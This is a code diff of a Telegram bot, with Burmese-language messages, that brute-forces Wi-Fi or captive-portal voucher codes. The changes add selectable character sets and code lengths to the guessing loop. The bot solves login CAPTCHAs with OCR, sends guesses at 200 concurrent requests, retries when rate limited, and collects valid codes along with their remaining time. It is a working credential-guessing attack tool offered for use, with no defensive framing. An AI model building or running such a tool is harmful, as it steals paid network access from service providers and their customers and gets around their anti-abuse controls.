@@ -5,7 +5,7 @@ from aiohttp import web
 import cv2
 import ddddocr
 import numpy as np
-from datetime import datetime, timedelta, timezone
+from datetime import datetime, timezone
 
 # ── Environment variables ─────────────────────────────────────────────────
 def _env(name, fallback):
@@ -36,6 +36,10 @@ notify_state = {}
 session = None
 _connector = None
 
+CONCURRENCY = 200
+_voucher_sem = None
+_start_time = time.monotonic()
+
 # ── Helper: send long text in ≤4096-char chunks split at newlines ──────────
 async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
     MAX = 4096
@@ -59,10 +63,6 @@ async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=
     if chunk:
         await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                                reply_to_message_id=reply_to_message_id if first else None)
-
-CONCURRENCY = 200
-_voucher_sem = None
-_start_time = time.monotonic()
 
 # ── Web server (keep alive) ────────────────────────────────────────────────
 async def handle(request):
@@ -114,7 +114,7 @@ async def update_file_content_retry(path, content, sha, message, retries=2):
                 continue
             raise
 
-# ── Plan parsing helpers ──────────────────────────────────────────────────
+# ── Plan parsing ──────────────────────────────────────────────────────────
 PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)
 
 def plan_to_minutes(s):
@@ -136,34 +136,76 @@ def plan_to_minutes(s):
             total += val
     return total
 
-def iter_codes(mode):
-    if mode in ["6", "7"]:
-        length = int(mode)
+# ── Mode info ─────────────────────────────────────────────────────────────
+MODE_INFO = {
+    "1": ("ဂဏန်းသီးသန့် (0-9)",       string.digits,                          10),
+    "2": ("အင်္ဂလိပ်အသေး (a-z)",       string.ascii_lowercase,                 26),
+    "3": ("အင်္ဂလိပ်အကြီး (A-Z)",       string.ascii_uppercase,                 26),
+    "4": ("အကြီး+အသေး (a-zA-Z)",       string.ascii_letters,                   52),
+    "5": ("အသေး+ဂဏန်း (a-z, 0-9)",      string.ascii_lowercase + string.digits, 36),
+}
+
+def iter_codes(mode, length):
+    """Generate codes for mode 1-5.
+    Mode 1 with length <= 6 → exhaustive (shuffled). Otherwise random."""
+    mode = str(mode)
+    length = int(length)
+    if mode not in MODE_INFO:
+        raise ValueError(f"Mode သည် 1-5 အတွင်း ဖြစ်ရပါမည်။ (got {mode})")
+    if length < 1 or length > 20:
+        raise ValueError("Length သည် 1-20 အတွင်း ဖြစ်ရပါမည်။")
+
+    label, chars, base = MODE_INFO[mode]
+
+    if mode == "1" and length <= 6:
         n = 10 ** length
         order = list(range(n))
         random.shuffle(order)
         for i in order:
             yield str(i).zfill(length)
         return
-    if mode == "8":
-        while True:
-            yield "".join(random.choice(string.digits) for _ in range(8))
-    if mode == "ascii-lower":
-        while True:
-            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
-    if mode == "all":
-        chars = string.ascii_lowercase + string.digits
-        while True:
-            yield "".join(random.choice(chars) for _ in range(6))
-    raise ValueError(f"Unsupported scan mode: {mode}")
 
-def format_progress(checked, total=None, speed=0, found=0, target=None):
-    lines = [
-        "📋 Status: Running",
-        f"⚡ Speed: {speed:,.0f}/min",
-        f"🔍 Checked: {checked:,}",
-        f"💎 Found: {found}",
-    ]
+    while True:
+        yield "".join(random.choice(chars) for _ in range(length))
+
+def mode_length_universe_size(mode, length):
+    if mode == "1" and length <= 6:
+        return 10 ** length
+    return None
+
+def parse_length_spec(spec):
+    """'6' | '6,7,8' | '6-8' | '6,8-10,12' → [6,7,8,...]"""
+    lengths = set()
+    for part in spec.split(','):
+        part = part.strip()
+        if not part:
+            continue
+        if '-' in part:
+            a, b = part.split('-', 1)
+            a, b = int(a), int(b)
+            if a > b:
+                a, b = b, a
+            for i in range(a, b + 1):
+                lengths.add(i)
+        else:
+            lengths.add(int(part))
+    result = sorted(lengths)
+    if not result:
+        raise ValueError("Length spec empty")
+    for L in result:
+        if L < 1 or L > 20:
+            raise ValueError(f"Length {L} သည် 1-20 အတွင်း ဖြစ်ရပါမည်။")
+    return result
+
+def format_progress(checked, total=None, speed=0, found=0, target=None,
+                    current_length=None, lengths=None):
+    lines = ["📋 Status: Running"]
+    if current_length is not None and lengths and len(lengths) > 1:
+        idx = (lengths.index(current_length) + 1) if current_length in lengths else "?"
+        lines.append(f"📏 Length: {current_length} ({idx}/{len(lengths)})")
+    lines.append(f"⚡ Speed: {speed:,.0f}/min")
+    lines.append(f"🔍 Checked: {checked:,}")
+    lines.append(f"💎 Found: {found}")
     if target:
         lines.append(f"🎯 Target: {found}/{target}")
     return "\n".join(lines)
@@ -335,12 +377,10 @@ async def get_balance(session_id):
                 data = json.loads(raw)
             except Exception:
                 return "N/A"
-
             candidates = [data]
             for nested_key in ['result', 'data']:
                 if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                     candidates.append(data[nested_key])
-
             for d in candidates:
                 if not isinstance(d, dict):
                     continue
@@ -352,7 +392,6 @@ async def get_balance(session_id):
                     val = d.get(key)
                     if val is not None:
                         return _parse_seconds(val)
-
             return "N/A"
     except Exception as e:
         print(f"[get_balance] error for {session_id}: {e}")
@@ -383,7 +422,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             session_id = await get_session_id(task_session, session_url)
             if not session_id:
                 continue
-
             auth_code = None
             for _ in range(8):
                 try:
@@ -399,12 +437,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     continue
             if not auth_code:
                 continue
-
             if not recheck:
                 current_task = scan_tasks.get(chat_id)
                 if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                     return
-
             data = {
                 "accessCode": code,
                 "sessionId": session_id,
@@ -435,7 +471,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 print(f"[perform_check] post error (attempt {attempt+1}/3): {e}")
                 response = None
                 continue
-
         if response and 'request limited' in response:
             print(f"[perform_check] rate limited on code={code}, retrying (attempt {attempt+1}/3)")
             continue
@@ -447,7 +482,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     if 'logonUrl' in response:
         if recheck:
             return code
-
         plan_str = "N/A"
         try:
             fetched = await get_balance(session_id)
@@ -455,30 +489,24 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 plan_str = fetched
         except Exception:
             pass
-
         if plan_filters:
             code_mins = plan_to_minutes(plan_str)
             if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                 return None
-
         if chat_id not in success_texts:
             success_texts[chat_id] = []
         success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})
-
         await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_str})
-
         if notify_setting.get(chat_id, False) and message:
             try:
                 items = success_texts[chat_id]
                 n = len(items)
                 pages = notify_state.get(chat_id) or []
                 MAX = 4096
-
                 def build_page_text(first_idx):
                     lines = [f"`{it['code']}` – ⏳ {it.get('plan','N/A')}" for it in items[first_idx:]]
                     header = f"✅ Success Codes ({n}):\n" if first_idx == 0 else f"✅ Success Codes (cont. {first_idx+1}–{n}):\n"
                     return header + "\n".join(lines)
-
                 if not pages:
                     text = build_page_text(0)
                     sent = await bot.send_message(chat_id, text, parse_mode="Markdown")
@@ -534,17 +562,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 success_messages = {}
 limited_messages = {}
 
-async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
-    try:
-        code_iter = iter_codes(mode)
-    except ValueError as e:
-        await bot.send_message(chat_id, str(e))
-        return
-
-    total = None
-    if mode in ["6", "7"]:
-        total = 10 ** int(mode)
-
+async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
+                         target=None, message=None, progress_msg=None,
+                         plan_filters=None):
     checked = 0
     found = 0
     scan_start = time.monotonic()
@@ -554,74 +574,90 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
         _voucher_sem = asyncio.Semaphore(CONCURRENCY)
 
     try:
-        while True:
-            current_task = scan_tasks.get(chat_id)
-            if not current_task or current_task.get("scan_id") != scan_id:
-                return
-            if current_task.get("stop"):
-                last_scan_params[chat_id] = {"mode": mode, "target": target, "plan_filters": plan_filters or []}
-                save_state()
-                scan_tasks.pop(chat_id, None)
-                return
-
-            batch = []
-            for _ in range(1000):
-                try:
-                    batch.append(next(code_iter))
-                except StopIteration:
-                    break
-            if not batch:
-                break
-
-            async def _check(code):
-                async with _voucher_sem:
-                    return await perform_check(
-                        session_url, code, chat_id, scan_id, message=message,
-                        plan_filters=plan_filters
-                    )
-
-            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
-
-            for res in results:
-                if res:
-                    found += 1
-                    if target and found >= target:
-                        try:
-                            await bot.edit_message_text(
-                                chat_id=chat_id,
-                                message_id=progress_msg.message_id,
-                                text="🎯 Target reached!"
-                            )
-                        except Exception:
-                            await bot.send_message(chat_id, "🎯 Target reached!")
-                        scan_tasks.pop(chat_id, None)
-                        last_scan_params.pop(chat_id, None)
-                        save_state()
-                        return
-
-            checked += len(batch)
-
-            elapsed = time.monotonic() - scan_start
-            speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            text = format_progress(checked, total, speed, found, target)
+        for li, length in enumerate(lengths):
             try:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=progress_msg.message_id,
-                    text=text
-                )
-            except Exception as e:
-                if "not modified" not in str(e).lower():
+                code_iter = iter_codes(mode, length)
+            except ValueError as e:
+                await bot.send_message(chat_id, str(e))
+                return
+            total = mode_length_universe_size(mode, length)
+
+            while True:
+                current_task = scan_tasks.get(chat_id)
+                if not current_task or current_task.get("scan_id") != scan_id:
+                    return
+                if current_task.get("stop"):
+                    remaining = lengths[li:]
+                    last_scan_params[chat_id] = {
+                        "mode": mode, "lengths": remaining,
+                        "target": target, "plan_filters": plan_filters or []
+                    }
+                    save_state()
+                    scan_tasks.pop(chat_id, None)
+                    return
+
+                batch = []
+                for _ in range(1000):
                     try:
-                        new_msg = await bot.send_message(chat_id, text)
-                        progress_msg.message_id = new_msg.message_id
-                    except Exception:
-                        pass
+                        batch.append(next(code_iter))
+                    except StopIteration:
+                        break
+                if not batch:
+                    break
+
+                async def _check(code):
+                    async with _voucher_sem:
+                        return await perform_check(
+                            session_url, code, chat_id, scan_id,
+                            message=message, plan_filters=plan_filters
+                        )
+
+                results = await asyncio.gather(
+                    *[_check(code) for code in batch], return_exceptions=True
+                )
+
+                for res in results:
+                    if res:
+                        found += 1
+                        if target and found >= target:
+                            try:
+                                await bot.edit_message_text(
+                                    chat_id=chat_id,
+                                    message_id=progress_msg.message_id,
+                                    text="🎯 Target reached!"
+                                )
+                            except Exception:
+                                await bot.send_message(chat_id, "🎯 Target reached!")
+                            scan_tasks.pop(chat_id, None)
+                            last_scan_params.pop(chat_id, None)
+                            save_state()
+                            return
+
+                checked += len(batch)
+                elapsed = time.monotonic() - scan_start
+                speed = (checked / elapsed * 60) if elapsed > 0 else 0
+                text = format_progress(checked, total, speed, found, target,
+                                       current_length=length, lengths=lengths)
+                try:
+                    await bot.edit_message_text(
+                        chat_id=chat_id,
+                        message_id=progress_msg.message_id,
+                        text=text
+                    )
+                except Exception as e:
+                    if "not modified" not in str(e).lower():
+                        try:
+                            new_msg = await bot.send_message(chat_id, text)
+                            progress_msg.message_id = new_msg.message_id
+                        except Exception:
+                            pass
 
         if progress_msg:
-            finish_text = "✅ Scan completed."
+            finish_text = "✅ Scan completed (all lengths done)."
             try:
-                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
+                await bot.edit_message_text(
+                    chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text
+                )
             except Exception:
                 await bot.send_message(chat_id, finish_text)
         scan_tasks.pop(chat_id, None)
@@ -660,6 +696,7 @@ async def github_update_scheduler():
                 for it in items:
                     await SUCCESS_CODE.put(it)
 
+# ── State save/load ───────────────────────────────────────────────────────
 STATE_FILE = "state.json"
 
 def save_state():
@@ -693,7 +730,7 @@ def load_state():
     except Exception as e:
         print(f"[load_state] error: {e}")
 
-# ── Load saved results from GitHub on startup ──────────────────────────────
+# ── Load saved results ────────────────────────────────────────────────────
 async def load_saved_results():
     try:
         results, _ = await get_file_content("result.json")
@@ -720,6 +757,38 @@ async def load_saved_results():
     except Exception as e:
         print(f"[startup] Could not load result.json: {e}")
 
+# ── Usage text ────────────────────────────────────────────────────────────
+USAGE_TEXT = (
+    "📖 **Voucher Bot အသုံးပြုနည်း**\n\n"
+    "**၁။ Setup:**\n"
+    "`/setup <url>`\n\n"
+    "**၂။ ရှာဖွေခြင်း:**\n"
+    "`/brute <mode> <lengths> [target] [plan]`\n\n"
+    "*Mode:*\n"
+    "  1 = ဂဏန်းသီးသန့် (0-9)\n"
+    "  2 = အင်္ဂလိပ်အသေး (a-z)\n"
+    "  3 = အင်္ဂလိပ်အကြီး (A-Z)\n"
+    "  4 = အကြီး+အသေး (a-zA-Z)\n"
+    "  5 = အသေး+ဂဏန်း (a-z, 0-9)\n\n"
+    "*Lengths:*\n"
+    "  `6`         → length 6 တစ်ခုတည်း\n"
+    "  `6,7,8`     → length 6, 7, 8 သုံးခု ဆက်တိုက်\n"
+    "  `6-8`       → range 6-8\n"
+    "  `6,8-10,12` → mixed\n\n"
+    "*ဥပမာ:*\n"
+    "  `/brute 1 6 5`        → ဂဏန်း ၆လုံး ၅ခု\n"
+    "  `/brute 1 4-8 10`     → ဂဏန်း ၄-၈လုံး ၁၀ခု\n"
+    "  `/brute 5 4,6-8 1d`   → alnum ၄,၆,၇,၈လုံး ၁ရက်\n"
+    "  `/brute 2 6 1d 1mo`   → lowercase ၆လုံး ၁ရက်/၁လ\n\n"
+    "**၃။** `/status` – အခြေအနေကြည့်\n"
+    "**၄။** `/stop` – ရပ်တန့်\n"
+    "**၅။** `/resume` – ဆက်ရှာ\n"
+    "**၆။** `/saved` – ရလဒ်ကြည့်\n"
+    "**၇။** `/delete_saved` – ရလဒ်ဖျက်\n"
+    "**၈။** `/recheck` – Success codes ပြန်စစ်\n"
+    "**၉။** `/notify` – Notification ON/OFF"
+)
+
 # ── Bot commands ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['start'])
 async def start(message):
@@ -727,22 +796,7 @@ async def start(message):
 
 @bot.message_handler(commands=['help'])
 async def help_cmd(message):
-    help_text = (
-        "📚 **Command လမ်းညွှန်**\n\n"
-        "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
-        "/brute <mode> [target] [plan] - Code စတင်ရှာဖွေရန်\n"
-        "   /brute 6 10 1d        → ၁ရက် code ၁၀ ခုရှာ\n"
-        "   /brute 6 1d unlimit  → ၁ရက်(သို့) unlimit code ရှာ\n"
-        "   /brute 6 10 1d 1mo   → ၁ရက် (သို့) ၁လ code ၁၀ ခုရှာ\n"
-        "   /brute 6             → အစုံရှာ\n"
-        "/stop - ရှာဖွေနေသည့် လုပ်ငန်းစဉ်အားရပ်ရန်\n"
-        "/resume - ရပ်ထားသည့် scan ကို ပြန်စရန်\n"
-        "/saved - လက်ရှိ session success/limited codes ကြည့်ရန်\n"
-        "/notify - code တွေ့တိုင်း အကြောင်းကြားချက်ကို On/Off\n"
-        "/recheck - သိမ်းထားသော success codes များကို ပြန်လည်စစ်ဆေးရန်\n"
-        "/status - (Admin) Bot အခြေအနေကြည့်ရန်"
-    )
-    await bot.reply_to(message, help_text, parse_mode="Markdown")
+    await bot.reply_to(message, USAGE_TEXT, parse_mode="Markdown")
 
 @bot.message_handler(commands=['setup'])
 async def handle_setup(message):
@@ -754,15 +808,12 @@ async def handle_setup(message):
     await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
     if await check_session_url(url):
         cid = message.chat.id
-
         if cid in scan_tasks:
             task_info = scan_tasks.pop(cid, None)
             if task_info and task_info.get("task"):
                 task_info["task"].cancel()
-
         user_data.setdefault(cid, {})
         user_data[cid]['session_url'] = url
-
         success_texts.pop(cid, None)
         limited_texts.pop(cid, None)
         captcha_state.pop(cid, None)
@@ -771,7 +822,6 @@ async def handle_setup(message):
         success_messages.pop(cid, None)
         limited_messages.pop(cid, None)
         notify_state.pop(cid, None)
-
         try:
             results, sha = await get_file_content("result.json")
             if str(cid) in results:
@@ -779,7 +829,6 @@ async def handle_setup(message):
                 await update_file_content_retry("result.json", results, sha, f"Clear codes for {cid} on new setup")
         except Exception as e:
             print(f"[setup] Failed to clear GitHub result.json: {e}")
-
         save_state()
         await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n/brute ဖြင့် စတင်ပါ။")
     else:
@@ -788,37 +837,38 @@ async def handle_setup(message):
 @bot.message_handler(commands=['brute'])
 async def brute(message):
     args = message.text.split()
-    if len(args) < 2:
-        await bot.reply_to(message,
-            "အသုံးပြုနည်း:\n"
-            "/brute <mode> [target] [plan]\n\n"
-            "ဥပမာ:\n"
-            "/brute 6 10 1d        → ၁ရက် code ၁၀ ခု\n"
-            "/brute 6 1d unlimit  → ၁ရက် (သို့) unlimit code\n"
-            "/brute 6 10 1d 1mo   → ၁ရက် (သို့) ၁လ code ၁၀ ခု\n"
-            "/brute 6             → အစုံရှာ\n\n"
-            "Plan ကိုယ်ကြိုက်သလောက်ပေးနိုင် (30min, 2h, 1d, 1mo, unlimit ...)"
-        )
+    # /brute <mode> <lengths> [target] [plan...]
+    if len(args) < 3:
+        await bot.reply_to(message, USAGE_TEXT, parse_mode="Markdown")
         return
 
     mode = args[1]
+    if mode not in MODE_INFO:
+        await bot.reply_to(message, "❌ Mode သည် 1-5 အတွင်း ဖြစ်ရပါမည်။\nMode အသေးစိတ်အတွက် /help ကြည့်ပါ။")
+        return
+
+    try:
+        lengths = parse_length_spec(args[2])
+    except ValueError as e:
+        await bot.reply_to(message, f"❌ Length spec မှားနေသည်: {e}\nဥပမာ: 6 | 6,7,8 | 6-8 | 6,8-10,12")
+        return
+
     target = None
     plan_filters = []
-
-    idx = 2
+    idx = 3
     if idx < len(args) and not PLAN_RE.match(args[idx]):
         try:
             target = int(args[idx])
             idx += 1
         except ValueError:
-            await bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။\nPlan ဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
+            await bot.reply_to(message, "❌ Target သည် ဂဏန်းဖြစ်ရပါမည်။\nPlan ဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
             return
 
     for arg in args[idx:]:
         if PLAN_RE.match(arg):
             plan_filters.append(arg)
         else:
-            await bot.reply_to(message, f"'{arg}' သည် plan ပုံစံမမှန်ပါ။\nဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
+            await bot.reply_to(message, f"❌ '{arg}' သည် plan ပုံစံမမှန်ပါ။\nဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
             return
 
     chat_id = message.chat.id
@@ -830,24 +880,34 @@ async def brute(message):
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                    InlineKeyboardButton("New Scan", callback_data="new_scan"))
-        pending_brute[chat_id] = {"mode": mode, "target": target, "plan_filters": plan_filters}
+        pending_brute[chat_id] = {
+            "mode": mode, "lengths": lengths,
+            "target": target, "plan_filters": plan_filters
+        }
         prev = last_scan_params[chat_id]
+        prev_len = prev.get('lengths') or prev.get('length') or '?'
         prev_plans = ' / '.join(prev.get('plan_filters') or []) or 'any'
         await bot.reply_to(message,
-            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, target: {prev['target']}, plan: {prev_plans}).\nပြန်စမလား၊ အသစ်စမလား?",
+            f"ယခင် scan ရပ်ထားသည် (mode: {prev.get('mode','?')}, lengths: {prev_len}, "
+            f"target: {prev.get('target')}, plan: {prev_plans}).\nပြန်စမလား၊ အသစ်စမလား?",
             reply_markup=markup)
         return
 
-    await start_brute_scan(chat_id, mode, target, message, plan_filters=plan_filters)
+    await start_brute_scan(chat_id, mode, lengths, target, message, plan_filters=plan_filters)
 
-async def start_brute_scan(chat_id, mode, target, original_message, plan_filters=None):
+async def start_brute_scan(chat_id, mode, lengths, target, original_message, plan_filters=None):
     plan_filters = plan_filters or []
+    label = MODE_INFO.get(mode, ("?",))[0]
+    len_str = ",".join(map(str, lengths)) if isinstance(lengths, list) else str(lengths)
     filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
-    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}")
+    progress_msg = await bot.send_message(
+        chat_id,
+        f"Preparing... Mode {mode} ({label}), Lengths [{len_str}]{filter_note}"
+    )
     scan_id = str(uuid.uuid4())
     task = asyncio.create_task(
         run_bruteforce(
-            mode, chat_id, user_data[chat_id]['session_url'],
+            mode, lengths, chat_id, user_data[chat_id]['session_url'],
             scan_id, target, message=original_message, progress_msg=progress_msg,
             plan_filters=plan_filters
         )
@@ -881,7 +941,11 @@ async def resume_scan(message):
         return
     params = last_scan_params.pop(chat_id)
     save_state()
-    await start_brute_scan(chat_id, params['mode'], params['target'], message, plan_filters=params.get('plan_filters', []))
+    lengths = params.get('lengths') or ([params['length']] if 'length' in params else [6])
+    await start_brute_scan(
+        chat_id, params['mode'], lengths, params['target'],
+        message, plan_filters=params.get('plan_filters', [])
+    )
     await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")
 
 @bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
@@ -895,14 +959,21 @@ async def handle_resume_callback(call):
         params = last_scan_params.pop(chat_id)
         save_state()
         await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
-        await start_brute_scan(chat_id, params['mode'], params['target'], call.message, plan_filters=params.get('plan_filters', []))
+        lengths = params.get('lengths') or ([params['length']] if 'length' in params else [6])
+        await start_brute_scan(
+            chat_id, params['mode'], lengths, params['target'],
+            call.message, plan_filters=params.get('plan_filters', [])
+        )
     else:
         if chat_id in pending_brute:
             params = pending_brute.pop(chat_id)
             last_scan_params.pop(chat_id, None)
             save_state()
             await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
-            await start_brute_scan(chat_id, params['mode'], params['target'], call.message, plan_filters=params.get('plan_filters', []))
+            await start_brute_scan(
+                chat_id, params['mode'], params['lengths'], params['target'],
+                call.message, plan_filters=params.get('plan_filters', [])
+            )
         else:
             await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)
 
@@ -914,7 +985,6 @@ async def saved_codes(message):
     if not success and not limited:
         await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
         return
-
     parts = []
     if success:
         parts.append(f"✅ **Success Codes** ({len(success)})")
@@ -925,10 +995,38 @@ async def saved_codes(message):
     if limited:
         parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
         parts.extend(limited)
-
     full_text = "\n".join(parts)
     await send_chunks(message.chat.id, full_text, parse_mode="Markdown",
                       reply_to_message_id=message.message_id)
+
+@bot.message_handler(commands=['delete_saved'])
+async def delete_saved(message):
+    chat_id = message.chat.id
+    success_count = len(success_texts.get(chat_id, []))
+    limited_count = len(limited_texts.get(chat_id, []))
+
+    success_texts.pop(chat_id, None)
+    limited_texts.pop(chat_id, None)
+    notify_state.pop(chat_id, None)
+    success_messages.pop(chat_id, None)
+    limited_messages.pop(chat_id, None)
+
+    try:
+        results, sha = await get_file_content("result.json")
+        if str(chat_id) in results:
+            del results[str(chat_id)]
+            await update_file_content_retry("result.json", results, sha, f"Delete saved codes for {chat_id}")
+    except Exception as e:
+        print(f"[delete_saved] error: {e}")
+        await bot.reply_to(message, f"⚠️ Local ဖျက်ပြီးပါပြီ၊ GitHub မှ ဖျက်ရာတွင် error: `{e}`", parse_mode="Markdown")
+        return
+
+    await bot.reply_to(
+        message,
+        f"🗑️ ဖျက်ပြီးပါပြီ။\n"
+        f"  • Success: {success_count}\n"
+        f"  • Limited: {limited_count}"
+    )
 
 @bot.message_handler(commands=['notify'])
 async def toggle_notify(message):
